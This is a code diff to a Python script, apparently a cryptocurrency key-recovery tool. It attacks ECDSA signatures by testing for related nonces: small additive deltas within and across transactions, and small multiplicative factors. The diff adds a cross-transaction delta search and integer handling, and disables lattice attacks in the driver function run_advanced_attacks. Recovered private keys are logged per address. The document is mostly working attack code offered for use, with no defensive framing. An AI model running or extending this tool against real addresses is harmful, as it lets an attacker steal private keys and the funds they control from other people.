@@ -50,6 +50,8 @@ def solve_quadratic(A, B, C):
 
 def try_nonce_delta(sigs, address):
     print(f"Checking for Nonce Deltas in {len(sigs)} sigs for {address}...")
+    
+    # 1. Intra-TX check (high probability, fast)
     tx_groups = {}
     for sig in sigs:
         if sig['txid'] not in tx_groups:
@@ -72,6 +74,38 @@ def try_nonce_delta(sigs, address):
                             print(f"!!! SUCCESS !!! Nonce delta found in tx {txid}: k_{i} = k_{j} + {delta}")
                             add_recovered_key(address, hex(d)[2:].zfill(64), method='Nonce Delta')
                             return True
+                            
+    # 2. Cross-TX check (lower probability, slower)
+    # Use a limit if there are too many signatures to avoid O(N^2)
+    max_cross = 100
+    subset = sigs[:max_cross]
+    if len(sigs) > max_cross:
+        print(f"  Limiting cross-TX delta check to first {max_cross} sigs...")
+    
+    prep = []
+    for s in subset:
+        try:
+            s_inv = pow(s['s'], -1, P)
+            prep.append({'u': (s_inv * s['z']) % P, 't': (s_inv * s['r']) % P, 'txid': s['txid']})
+        except: continue
+        
+    for i in range(len(prep)):
+        for j in range(i + 1, len(prep)):
+            p1, p2 = prep[i], prep[j]
+            if p1['txid'] == p2['txid']: continue # Already checked
+            
+            dt = (p1['t'] - p2['t']) % P
+            if dt == 0: continue
+            dt_inv = pow(dt, -1, P)
+            
+            for delta in range(-10, 11): # Smaller range for cross-TX
+                if delta == 0: continue
+                d = ((p2['u'] - p1['u'] + delta) * dt_inv) % P
+                if verify_key(d, address):
+                    print(f"!!! SUCCESS !!! Cross-TX Nonce delta found: k_{i} = k_{j} + {delta}")
+                    add_recovered_key(address, hex(d)[2:].zfill(64), method='Cross-TX Nonce Delta')
+                    return True
+                    
     return False
 
 def try_nonce_lcg(sigs, address):
@@ -122,10 +156,17 @@ def try_nonce_multiplicative(sigs, address):
         for i in range(len(group)):
             for j in range(i + 1, len(group)):
                 s1, s2 = group[i], group[j]
+                # Ensure values are integers
+                try:
+                    s1_s, s1_z, s1_r = int(s1['s']), int(s1['z']), int(s1['r'])
+                    s2_s, s2_z, s2_r = int(s2['s']), int(s2['z']), int(s2['r'])
+                except (KeyError, TypeError, ValueError):
+                    continue
+                    
                 for c in range(1, 101):
                     for val_c in [c, pow(c, -1, P)]:
-                        num = (s1['s'] * val_c * s2['z'] - s2['s'] * s1['z']) % P
-                        den = (s2['s'] * s1['r'] - s1['s'] * val_c * s2['r']) % P
+                        num = (s1_s * val_c * s2_z - s2_s * s1_z) % P
+                        den = (s2_s * s1_r - s1_s * val_c * s2_r) % P
                         if den != 0:
                             d = (num * pow(den, -1, P)) % P
                             if verify_key(d, address):
@@ -146,10 +187,17 @@ def try_nonce_multiplicative(sigs, address):
             # Skip if already checked in the same TX
             if s1['txid'] == s2['txid']: continue
             
+            # Ensure values are integers
+            try:
+                s1_s, s1_z, s1_r = int(s1['s']), int(s1['z']), int(s1['r'])
+                s2_s, s2_z, s2_r = int(s2['s']), int(s2['z']), int(s2['r'])
+            except (KeyError, TypeError, ValueError):
+                continue
+                
             for c in range(1, 11): # Smaller range for cross-TX
                 for val_c in [c, pow(c, -1, P)]:
-                    num = (s1['s'] * val_c * s2['z'] - s2['s'] * s1['z']) % P
-                    den = (s2['s'] * s1['r'] - s1['s'] * val_c * s2['r']) % P
+                    num = (s1_s * val_c * s2_z - s2_s * s1_z) % P
+                    den = (s2_s * s1_r - s1_s * val_c * s2_r) % P
                     if den != 0:
                         d = (num * pow(den, -1, P)) % P
                         if verify_key(d, address):
@@ -216,8 +264,8 @@ def run_advanced_attacks():
         
         if try_nonce_delta(sigs, addr): continue
         if try_nonce_multiplicative(sigs, addr): continue
-        if try_msb_lattice(sigs, addr): continue
-        if try_lsb_lattice(sigs, addr): continue
+        #if try_msb_lattice(sigs, addr): continue
+        #if try_lsb_lattice(sigs, addr): continue
 
 if __name__ == "__main__":
     run_advanced_attacks()
